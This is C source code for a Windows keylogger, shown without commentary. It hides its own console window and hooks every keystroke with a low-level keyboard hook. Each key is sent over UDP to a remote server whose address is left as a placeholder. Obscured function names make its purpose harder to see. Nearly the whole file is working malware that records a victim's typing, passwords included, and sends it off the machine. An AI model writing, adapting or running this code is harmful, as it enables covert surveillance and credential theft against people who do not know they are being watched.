#include <winsock2.h> #include <windows.h> #include <conio.h> #include <stdio.h> #include <stdlib.h> #include <time.h> #include <string.h> #define PORT 8080 #define SERVER "xxx.xxx.xxx.xxx" typedef struct _HKDATA { int nType; HOOKPROC hkprc; HHOOK hhook; } HKDATA; HKDATA kh; UINT mkey; BOOL C = TRUE; WSADATA wD; SOCKET SSocket; SOCKADDR_IN RAddr; int R; LRESULT WINAPI rgdth(int, WPARAM, LPARAM); void gsdrvlg(void); void fk(char *); void fs(WSADATA wD, SOCKET s, SOCKADDR_IN r_addr, int r); int main(int argc, char **argv) { gsdrvlg(); time_t now = time(NULL); MSG msg; kh.nType = WH_KEYBOARD_LL; kh.hkprc = rgdth; kh.hhook = SetWindowsHookEx(kh.nType, kh.hkprc, (HINSTANCE)NULL, 0); if ((R = WSAStartup(MAKEWORD(2, 2), &wD)) != 0) { return 1; } if ((SSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) { WSACleanup(); return 1; } RAddr.sin_family = AF_INET; RAddr.sin_port = htons(PORT); RAddr.sin_addr.s_addr = inet_addr(SERVER); char *t = malloc(50); fk(t); free(t); while (GetMessage(&msg, NULL, 0, 0) != 0) { TranslateMessage(&msg); DispatchMessageW(&msg); } if (kh.hhook) UnhookWindowsHookEx(kh.hhook); closesocket(SSocket); WSACleanup(); return 1; } void fk(char *str) { int len = strlen(str); if ((R = sendto(SSocket, str, len + 1, 0, (SOCKADDR *)&RAddr, sizeof(RAddr))) == SOCKET_ERROR) { closesocket(SSocket); WSACleanup(); return; } } LRESULT WINAPI rgdth(int nCode, WPARAM wParam, LPARAM lParam) { PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam; char *buff = malloc(12); memset(buff, ' ', 12); if (nCode < 0) return CallNextHookEx(kh.hhook, nCode, wParam, lParam); if (nCode == HC_ACTION && wParam == WM_KEYDOWN) { mkey = MapVirtualKeyExW(key->vkCode, MAPVK_VK_TO_CHAR, GetKeyboardLayout(LANG_SYSTEM_DEFAULT)); switch (mkey) { case VK_RETURN: strcpy(buff, "[ENTER]"); break; case VK_ESCAPE: strcpy(buff, "[ESC]"); break; case VK_SPACE: strcpy(buff, "[SPACE]"); break; case 0x51: PostQuitMessage(0); default: sprintf(buff, "%c", mkey); } fk(buff); } memset(buff, 0, 12); free(buff); return CallNextHookEx(kh.hhook, nCode, wParam, lParam); } void gsdrvlg() { HWND window; AllocConsole(); window = FindWindowA("ConsoleWindowClass", NULL); ShowWindow(window, 0); }
